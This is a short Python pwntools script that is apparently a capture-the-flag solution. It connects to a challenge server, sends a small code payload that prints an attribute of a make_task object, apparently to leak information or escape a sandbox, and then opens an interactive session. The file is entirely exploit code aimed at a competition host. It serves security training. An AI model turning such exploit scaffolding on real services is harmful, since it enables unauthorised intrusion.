from pwn import *

p = remote("challs.xmas.htsp.ro", 12001)

payload = """
print("START")
print(make_task([1]).add)
"""

p.sendlineafter("code>", payload)
p.sendlineafter("code>", "END_OF_PWN")

p.recvuntil("START")

p.interactive()
